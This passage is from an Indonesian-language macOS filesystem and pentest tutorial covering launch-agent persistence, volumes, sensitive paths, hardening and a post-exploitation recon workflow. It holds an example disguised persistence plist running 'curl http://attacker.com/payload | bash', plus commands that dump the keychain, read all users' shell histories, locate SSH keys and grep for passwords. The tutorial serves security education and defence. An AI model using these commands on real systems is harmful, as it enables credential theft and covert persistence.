$ launchctl list | grep -v com.apple    # filter out Apple's own (focus on 3rd-party)

# Load / unload a launch agent manually
$ launchctl load ~/Library/LaunchAgents/com.example.agent.plist
$ launchctl unload ~/Library/LaunchAgents/com.example.agent.plist

# Example malicious-style persistence plist structure:
cat << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update.helper</string>     <!-- disguised name -->
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://attacker.com/payload | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

# ── LOGIN ITEMS (GUI-visible startup apps) ──────────────────────────
$ osascript -e 'tell application "System Events" to get the name of every login item'

# ── LEGACY CRON (still works, but rarely used by modern macOS) ─────
$ crontab -l
$ sudo crontab -l -u root

# ── PERIODIC SCRIPTS (built-in maintenance, rarely abused but exists) ─
$ ls /etc/periodic/daily/
$ ls /etc/periodic/weekly/
$ ls /etc/periodic/monthly/

# ── AUDIT FOR SUSPICIOUS PERSISTENCE (quick triage) ──────────────────
$ for dir in ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons; do
    echo "=== $dir ==="
    ls -la "$dir" 2>/dev/null
done
```

### Tabel Prioritas Lokasi Persistence

| Lokasi | Berjalan sebagai | Catatan | Nilai pentest |
|--------|-------------------|---------|-----------------|
| `~/Library/LaunchAgents/` | User saat ini | Tidak perlu admin | Kritis |
| `/Library/LaunchAgents/` | User mana pun yang login | Perlu admin untuk menulis | Kritis |
| `/Library/LaunchDaemons/` | root | Perlu admin, jalan tanpa login | Kritis |
| `/System/Library/LaunchDaemons/` | root | Dilindungi SIP (khusus Apple) | Rendah (sudah terlindungi) |
| Login Items | User saat ini | Terlihat di System Settings | Tinggi |

---

## 17. Volumes dan APFS — Struktur Volume Modern

`/Volumes` berisi semua drive eksternal, network share, dan disk image yang ter-mount, mirip dengan `/mnt` dan `/media` di Linux. Boot drive (`Macintosh HD`) juga muncul di sini sebagai referensi diri.

```bash
# List mounted volumes
$ ls /Volumes/
$ diskutil list

# Mount a disk image (.dmg)
$ hdiutil attach SomeApp.dmg

# Unmount a volume
$ diskutil unmount /Volumes/USB_DRIVE
$ diskutil eject /Volumes/USB_DRIVE

# Check disk usage
$ df -h

# View APFS container details
$ diskutil apfs list

# Create an APFS snapshot (used by Time Machine)
$ tmutil snapshot

# List Time Machine snapshots
$ tmutil listlocalsnapshots /

# Check FileVault encryption status
$ fdesetup status
FileVault is On.

# Mount a remote SMB/AFP share
$ mount_smbfs //user@server/share /Volumes/share
```

| Path | Fungsi |
|------|--------|
| `/Volumes/` | Drive eksternal dan network share |
| `diskutil` | Manajemen disk dan partisi |
| `tmutil` | Time Machine dan snapshot |
| `fdesetup` | Kontrol FileVault |

---

## 18. Catatan Keamanan: Lokasi Sensitif dan Hardening Defensif

Lokasi berikut bernilai tinggi bagi penyerang maupun defender. Gunakan untuk audit TCC/SIP, hygiene Keychain, dan hardening LaunchAgent pada Mac yang kamu kelola, bukan sebagai panduan eksploitasi privilege escalation.

```bash
# ── HIGH-VALUE PATHS (defender inventory) ────────────────────
~/Library/Keychains/login.keychain-db
/Library/Keychains/System.keychain
# Prefer FileVault + strong login password; lock keychain when idle

~/Library/Application\ Support/com.apple.TCC/TCC.db
# Audit privacy grants; reset overly broad app permissions

~/.ssh/                 # private keys: mode 700/600
~/.zsh_history          # avoid secrets on CLI

~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
# Inventory plist labels; alert on unsigned / unexpected jobs

# Platform protections (verify enabled)
csrutil status          # SIP
spctl --status          # Gatekeeper
fdesetup status         # FileVault
```

### Fokus Hardening Defensif

| Kontrol | Tindakan |
|---------|----------|
| FileVault | Enkripsi disk penuh |
| SIP / Gatekeeper | Biarkan tetap aktif |
| Keychain | Kunci saat idle; tidak ada login bersama |
| LaunchAgents | Baseline dengan plist bertanda tangan |
| TCC | Izin privasi seminimal mungkin |
| SSH keys | `chmod 600`; pakai passphrase |
| Unified logging | Teruskan event autentikasi |

LaunchDaemons yang tidak terduga, SIP/Gatekeeper yang dinonaktifkan, atau plist LaunchAgent yang bisa ditulis siapa saja adalah temuan hardening yang kritis (lihat Apple Platform Security Guide).

### Tabel Prioritas Keamanan macOS

| Lokasi | Level risiko | Alasan |
|--------|---------------|--------|
| `login.keychain-db` | Kritis | Password dan sertifikat tersimpan |
| `TCC.db` | Kritis | Database izin privasi |
| `~/.ssh/id_rsa` | Tinggi | SSH private key |
| `LaunchAgents/Daemons` | Kritis | Vektor persistence utama |
| `.zsh_history` | Tinggi | Riwayat perintah plus password |
| `chat.db` / `History.db` | Tinggi | Data pribadi sensitif |
| `/etc/sudoers` | Kritis | Konfigurasi izin root |
| `.DS_Store` | Sedang | Kebocoran struktur folder |
| `DiagnosticReports/` | Sedang | Detail crash dan memori |

---

## Tabel Referensi Direktori Lengkap

| Direktori | Fungsi | Setara di Linux |
|-----------|--------|-------------------|
| `/` | Direktori root (tampilan firmlink) | `/` |
| `/Applications` | Aplikasi terinstal | `/usr/share/applications` (kurang lebih) |
| `/System` | Inti OS, dilindungi SIP | `/usr`, `/lib` (gabungan) |
| `/Library` | Data aplikasi level-sistem | `/etc`, `/var/lib` (kurang lebih) |
| `~/Library` | Data aplikasi per-user | `~/.config`, `~/.local/share` |
| `/Users` | Direktori home pengguna | `/home` |
| `/private/etc` | Konfigurasi Unix | `/etc` |
| `/private/var` | Data variabel dan log | `/var` |
| `/private/tmp` | File sementara | `/tmp` |
| `/bin`, `/sbin` | Binary Unix esensial | `/bin`, `/sbin` |
| `/usr` | Resource Unix bersama | `/usr` |
| `/opt/homebrew` | Package manager (Apple Silicon) | `/usr/local` |
| `/Volumes` | Drive eksternal dan mount | `/mnt`, `/media` |

---

## 19. Contoh Workflow Praktis

```bash
# ── SCENARIO: macOS post-exploitation filesystem recon ──────────────

# 1. Who am I and what privileges do I have?
$ whoami
$ id
$ groups
$ dscl . -read /Groups/admin GroupMembership

# 2. System information
$ sw_vers                              # macOS version
$ uname -a
$ system_profiler SPHardwareDataType   # hardware details
$ sysctl -n machdep.cpu.brand_string   # CPU info

# 3. List all local users
$ dscl . list /Users | grep -v "^_"
$ dscl . -read /Users/alice

# 4. Check SIP and Gatekeeper status
$ csrutil status
$ spctl --status

# 5. Hunt for credentials in Keychain
$ security dump-keychain ~/Library/Keychains/login.keychain-db
$ security find-generic-password -ga "wifi-network-name"

# 6. Check shell history across all users
$ for user in $(dscl . list /Users | grep -v "^_"); do
    echo "=== $user ==="
    sudo cat "/Users/$user/.zsh_history" 2>/dev/null
done

# 7. Find SSH keys
$ find /Users -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# 8. Check persistence locations
$ ls -la ~/Library/LaunchAgents/ /Library/LaunchAgents/ /Library/LaunchDaemons/
$ launchctl list | grep -v com.apple

# 9. Check login items
$ osascript -e 'tell application "System Events" to get the name of every login item'

# 10. Check sudo privileges
$ sudo -l

# 11. Find writable system locations (privesc)
$ find / -writable -type d 2>/dev/null | grep -v -E "^/(dev|proc|private/var/folders)"

# 12. Check installed applications for known vulnerable versions
$ system_profiler SPApplicationsDataType > installed_apps.txt

# 13. Search for credentials in config files
$ grep -r "password" ~/Library/Application\ Support/ 2>/dev/null | head -20

# 14. Check recent security-related unified log events
$ log show --predicate 'eventMessage contains "authentication" OR eventMessage contains "sudo"' --last 1d

# 15. Check TCC database for privacy permission grants (Full Disk Access apps etc.)
$ sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client, service FROM access WHERE auth_value=2;"
```

---

## Referensi Cepat

```bash
# ── NAVIGATION ───────────────────────────────────────────────────
cd /                                # go to root
ls -la ~/Library                    # hidden per-user library
chflags nohidden ~/Library          # unhide Library in Finder
open .                              # open current dir in Finder
open -a "Terminal" .                # open in new Terminal window

# ── SYSTEM INFO ──────────────────────────────────────────────────
sw_vers                             # macOS version
uname -a                            # kernel info
system_profiler SPHardwareDataType  # hardware details
sysctl -n hw.model                  # Mac model identifier
uname -m                            # arm64 (Apple Silicon) or x86_64 (Intel)

# ── USER & GROUPS ────────────────────────────────────────────────
dscl . list /Users                  # all user accounts
dscl . -read /Users/<user>          # user details
dscl . -read /Groups/admin GroupMembership   # admin members
id; whoami; groups

# ── KEYCHAIN ─────────────────────────────────────────────────────
security list-keychains
security find-generic-password -ga "ServiceName"
security dump-keychain ~/Library/Keychains/login.keychain-db

# ── SECURITY PROTECTIONS ─────────────────────────────────────────
csrutil status                      # SIP status
spctl --status                      # Gatekeeper status
xattr -d com.apple.quarantine file  # remove quarantine flag
codesign -dv --verbose=4 app.app    # check code signature

# ── PERSISTENCE LOCATIONS ────────────────────────────────────────
~/Library/LaunchAgents/
/Library/LaunchAgents/
/Library/LaunchDaemons/
launchctl list | grep -v com.apple

# ── LOGS (UNIFIED LOGGING) ───────────────────────────────────────
log show --last 1h
log stream --predicate 'process == "sshd"'
log show --predicate 'eventMessage contains "password"' --last 1d

# ── NETWORK INFO ──────────────────────────────────────────────────
lsof -i -P                          # listening ports (netstat replacement)
networksetup -listallhardwareports
scutil --dns

# ── FIND COMMANDS ────────────────────────────────────────────────
find / -name "*.plist" 2>/dev/null              # find plist configs
find / -perm -4000 2>/dev/null                  # find SUID files
find / -writable -type d 2>/dev/null            # find writable dirs
find /Users -name "id_rsa" 2>/dev/null          # find SSH keys
find / -name "*.app" -maxdepth 4 2>/dev/null    # find installed apps

# ── DISK & VOLUMES ───────────────────────────────────────────────
diskutil list                       # list disks/volumes
df -h                                # disk usage
fdesetup status                      # FileVault encryption status
tmutil listlocalsnapshots /          # Time Machine snapshots

# ── APP BUNDLE ANALYSIS ──────────────────────────────────────────
plutil -p App.app/Contents/Info.plist     # read plist as JSON-like
otool -L App.app/Contents/MacOS/App        # linked libraries
lipo -info App.app/Contents/MacOS/App      # architecture info
codesign -d --entitlements - App.app       # entitlements
```

---

> Referensi dan Sumber Buku:
> - Apple, *Apple Platform Security Guide* (`https://support.apple.com/guide/security/welcome/web`)
> - [Apple Developer — File System Programming Guide](https://developer.apple.com/library/archive/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/)
> - Brian Ward, *How Linux Works* (`~/Documents/Books/CyberSec/Linux/`) — konsep filesystem Unix yang berlaku juga untuk Darwin
> - [Objective-See - macOS Security Resources](https://objective-see.org)
> - `man hier` — halaman manual untuk hierarki filesystem macOS

> **Zero2Root** | Seri Dasar-Dasar | kodoktheGr3at | 2026
> **Repository:** [Zero2Root](https://github.com/Kodokthegr3at/Zero2Root)
> **Masukan dan kontribusi diterima.** Buka issue atau PR kalau menemukan kesalahan.
